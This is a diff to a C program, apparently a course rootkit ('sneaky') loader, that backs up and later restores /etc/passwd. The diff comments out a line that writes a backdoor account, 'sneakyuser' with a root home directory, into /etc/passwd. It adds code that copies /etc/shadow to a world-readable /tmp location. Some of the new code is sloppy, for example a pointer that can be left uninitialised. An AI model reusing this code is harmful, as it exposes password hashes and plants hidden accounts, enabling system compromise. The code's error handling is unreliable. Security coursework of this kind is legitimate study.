@@ -4,18 +4,26 @@
 #include <string.h>
 #include <sys/wait.h>   
 
-int cp_passwd(){
+int cp_passwd(char* path){
   FILE *fin;
   FILE *fout;
   char c;
-  fin = fopen("/etc/passwd", "r+");
+  fin = fopen(path, "r+");
   if(fin == NULL){
     printf("Cannot open /etc/passwd\n");
     return EXIT_FAILURE;
   }
-  fout = fopen("/tmp/passwd","w");
+  char* copypath;
+  //memset(copypath, '\0', 32);
+  if(strcmp(path, "/etc/passwd") == 0){
+	copypath = "/tmp/passwd";
+  }
+  if(strcmp(path, "/etc/shadow") == 0){
+	copypath = "/tmp/shadow";
+  }
+  fout = fopen(copypath,"w");
   if(fout == NULL){
-    printf("Cannot open /tmp/passwd\n");
+    printf("Cannot open %s\n", copypath);
     return EXIT_FAILURE;
   }
   c = fgetc(fin);
@@ -23,34 +31,38 @@ int cp_passwd(){
     fputc(c, fout);
     c = fgetc(fin);
   }
-  int put = fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",fin);
+  /*int put = fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",fin);
   if(put == EOF){
     printf("fput failed\n");
     return EXIT_FAILURE;
   }
+  */
   if(fclose(fin) != 0){
-    printf("failed to close /etc/passwd\n");
+    printf("failed to close %s\n", path);
     return EXIT_FAILURE;
   }
   if(fclose(fout) != 0){
-    printf("failed to close /tmp/passwd\n");
+    printf("failed to close %s\n", path);
     return EXIT_FAILURE;
   }
   return EXIT_SUCCESS;
 }
 
-int restore_passwd(){
+int restore_passwd(char* copypath){
   FILE *fin;
   FILE *fout;
   char c;
-  fin = fopen("/tmp/passwd", "r+");
+  fin = fopen(copypath, "r+");
   if(fin == NULL){
-    printf("Cannot open /tmp/passwd\n");
+    printf("Cannot open %s\n", copypath);
     return EXIT_FAILURE;
   }
-  fout = fopen("/etc/passwd","w");
+  char* path;
+  if(strcmp(copypath, "/tmp/passwd") == 0) path = "/etc/passwd";
+  if(strcmp(copypath, "/tmp/shadow") == 0) path = "/etc/shadow";
+  fout = fopen(path,"w");
   if(fout == NULL){
-    printf("Cannot open /etc/passwd\n");
+    printf("Cannot open %s\n", path);
     return EXIT_FAILURE;
   }
   c = fgetc(fin);
@@ -59,19 +71,19 @@ int restore_passwd(){
     c = fgetc(fin);
   }
   if(fclose(fin) != 0){
-    printf("failed to close /tmp/passwd\n");
+    printf("failed to close %s\n", copypath);
     return EXIT_FAILURE;
   }
   if(fclose(fout) != 0){
-    printf("failed to close /etc/passwd\n");
+    printf("failed to close %s\n", path);
     return EXIT_FAILURE;
   }
   return EXIT_SUCCESS;
 }
 
 int main(){
-  //cp_passwd();
-  
+  cp_passwd("/etc/passwd");
+  cp_passwd("/etc/shadow");
   int sneaky_pid = getpid();
   pid_t fpid = fork();
   int status;
@@ -142,6 +154,7 @@ int main(){
       }
     }
   }
-  //restore_passwd();
+  restore_passwd("/tmp/passwd");
+  restore_passwd("/tmp/shadow");
   return EXIT_SUCCESS;
 }
